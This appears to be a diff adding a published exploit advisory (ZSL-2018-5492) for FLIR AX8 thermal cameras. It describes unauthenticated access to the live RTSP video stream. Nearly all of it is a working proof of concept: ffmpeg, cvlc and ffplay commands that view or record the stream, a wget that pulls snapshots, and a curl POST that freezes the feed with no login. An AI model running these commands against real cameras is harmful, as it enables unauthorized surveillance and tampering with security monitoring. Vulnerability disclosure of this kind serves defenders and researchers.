@@ -1,0 +1,24 @@
+# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - RTSP Stream Disclosure
+# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
+# Date: 2018-10-14
+# Vendor: FLIR Systems, Inc.
+# Product web page: https://www.flir.com
+# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
+# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
+# References:
+# Advisory ID: ZSL-2018-5492
+# https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5492.php
+
+# Desc: The FLIR AX8 thermal sensor camera suffers an unauthenticated and unauthorized
+# live RTSP video stream access.
+
+# PoC 
+
+$ cvlc rtsp://TARGET/mpeg4 --fullscreen
+$ ffmpeg -i rtsp://TARGET/mpeg4 -b 7000k -vcodec copy -r 60 -y ./meltdown.mp4
+$ ffplay rtsp://TARGET/mpeg4
+$ wget http://TARGET/snapshot.jpg ; eog snapshot.jpg
+
+# PoC - To freeze the stream:
+
+$ curl -d "action=set&resource=.image.state.freeze.set&value=true" -X POST http://TARGET/res.php
